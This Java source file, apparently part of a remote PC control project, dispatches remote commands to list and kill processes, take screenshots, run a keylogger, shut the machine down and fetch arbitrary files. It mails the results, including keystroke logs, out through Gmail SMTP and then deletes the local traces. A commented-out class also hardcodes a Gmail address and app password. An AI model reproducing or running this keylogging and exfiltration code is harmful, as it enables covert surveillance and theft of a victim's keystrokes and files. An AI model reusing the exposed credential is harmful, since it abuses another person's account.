package email;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

import javax.swing.ImageIcon;
// import java.util.Properties;
// import javax.mail.Authenticator;
// import javax.mail.Message;
// import javax.mail.MessagingException;
// import javax.mail.Multipart;
// import javax.mail.PasswordAuthentication;
// import javax.mail.Session;
// import javax.mail.Transport;
// import javax.mail.internet.InternetAddress;
// import javax.mail.internet.MimeBodyPart;
// import javax.mail.internet.MimeMessage;
// import javax.mail.internet.MimeMultipart;

// class SendMail {

//   Message message;
//   Session session;

//   public SendMail(String to) {
//     Properties properties = new Properties();
//     properties.put("mail.smtp.host", "smtp.gmail.com");
//     properties.put("mail.smtp.port", "587");
//     properties.put("mail.smtp.auth", "true");
//     properties.put("mail.smtp.starttls.enable", "true");

//     this.session =
//       Session.getDefaultInstance(
//         properties,
//         new Authenticator() {
//           protected PasswordAuthentication getPasswordAuthentication() {
//             return new PasswordAuthentication(
//               "dotu10257@gmail.com",
//               "zhylipsbmyvwzrkg"
//             );
//           }
//         }
//       );

//     try {
//       this.message = new MimeMessage(this.session);

//       this.message.setFrom(new InternetAddress("dotu10257@gmail.com"));

//       this.message.setRecipient(
//           Message.RecipientType.TO,
//           new InternetAddress(to)
//         );
//     } catch (MessagingException e) {
//       e.printStackTrace();
//     }
//   }

//   public void sendSubject(String subject) {
//     try {
//       this.message.setSubject(subject);
//       Transport.send(message);
//       System.out.println("Send mail file success!");
//     } catch (MessagingException e) {
//       e.printStackTrace();
//     }
//   }

//   public void sendFile(String path) {
//     try {
//       this.message.setSubject("Response remote file");
//       MimeBodyPart filePart = new MimeBodyPart();
//       filePart.attachFile(path);
//       Multipart multipart = new MimeMultipart();
//       multipart.addBodyPart(filePart);
//       this.message.setContent(multipart);
//       Transport.send(message);
//       System.out.println("Send mail file success!");
//     } catch (Exception e) {
//       e.printStackTrace();
//     }
//   }

//   public static void main(String[] args) {
//     SendMail send = new SendMail("dotu30257@gmail.com");
//     send.sendFile("name1.png");
//   }
// }

public class RemotePC {

  String[] message;
  String fullMessage;
  KeyLog keylog;
  SendMail send;

  public RemotePC(String message, KeyLog keylog, SendMail send) {
    this.fullMessage = message;
    this.message = message.split(":");
    this.keylog = keylog;
    this.send = send;
  }

  private void deleteFile(String path) {
    String filePath = path;

    File file = new File(filePath);

    if (file.exists()) {
      if (file.delete()) {
        System.out.println("Xóa tệp thành công.");
      } else {
        System.out.println("Không thể xóa tệp.");
      }
    } else {
      System.out.println("Tệp không tồn tại.");
    }
  }

  private String readFile(String filename) {
    try {
      FileReader fileReader = new FileReader(filename);
      BufferedReader bufferedReader = new BufferedReader(fileReader);
      String line;
      int count = 0;
      StringBuilder sb = new StringBuilder();
      while ((line = bufferedReader.readLine()) != null && count < 10) {
          sb.append(line).append("\n");
          count++;
      }
      bufferedReader.close();
      fileReader.close();

      String input = sb.toString();
      return "<html>" + input.replace("\n", "<br>") + "</html>";
    } catch (IOException e) {
        return "";
    }
  }

  public String run() {
    ProcessPC process = new ProcessPC();
    ServerThreading.statusRunning = fullMessage;
    switch (message[0]) {
      case "process":
        if (message[1].equals("list")) {
          process.listProcess();
          if (send.sendFile("process.txt"))
          {
            ServerThreading.fileDemo = readFile("process.txt");
            System.out.println("list process");
            return "The process.txt was sent successfully";
          }
          else return "list process failed!";
        }
        if (message[1].equals("start")) {
          System.out.println("starting process " + message[2]);
          if (process.startProcess(message[2]))
          {
              return "start process " + message[2] + " successfully";
          }
          else return "start process " + message[2] + " failed";
        }
        if (message[1].equals("stop")) {
          System.out.println("stop process PID " + message[2]);
          if (process.stopProcess(message[2]))
          {
              return "stop process PID " + message[2] + " successfully";
          }
          else return "stop process PID " + message[2] + " failed";
        }
        //break;
      case "screenshot":
        System.out.println(message[1]);
        ScreenShot screen = new ScreenShot(message[1]);
        System.out.println("screenshot suscessfull");
        ServerThreading.screenshotDemo = new ImageIcon(message[1]);
        ServerThreading.fileDemo = "";

        if (send.sendFile(message[1]))
        {
          System.out.println("Send suscessfull");
          deleteFile(message[1]);
          return "screenshot was sent successfully";
        }
        else return "screenshot was not sent successfully";
        //break;
      case "keylog":
        if (message[1].equals("start")) {
          if (this.keylog.isLoging == false) {
            this.keylog.start();
            System.out.println("start keylog");
            return "keylog started";
          } else {
            System.out.println("keylog is already running");
            return "keylog is already running";
          }
        }
        if (message[1].equals("stop")) {
          if (this.keylog.isLoging == true) {
            this.keylog.isLoging = false;
            this.keylog.stop();
            ServerThreading.fileDemo = readFile("keylog.txt");
            if (send.sendFile("keylog.txt"))
            {
              System.out.println("stop keylog");
              deleteFile("keylog.txt");
              return "keylog.txt was sent successfully";
            }
            else return "keylog.txt was not sent successfully";
          } else {
            System.out.println("keylog is not running");
            return "keylog is not running";
          }
        }
        //break;
      case "logout":
        process.logout();
        System.out.println("logout suscessfully");
        return "logout suscessfully";
        //break;
      case "shutdown":
        process.shutdown();
        System.out.println("shutdown suscessfully");
        return "shutdown in the next 1 hour";
        //break;
      case "getfile":
        String path = "";
        for (int i = 1; i < message.length; i++) {
          path += message[i];
          if (i != message.length-1) path += ':';
        }
        if (path.endsWith(".txt")) {
          ServerThreading.fileDemo = readFile(path);
        }
        if (send.sendFile(path))
        {
          System.out.println("get file suscessfull");
          return "Requested file was sent successfully";
        }
        else return "File error!";
        //break;
      default:
        System.out.println("command not found");
        return "Command not found !!!";
        //break;
    }
  }
}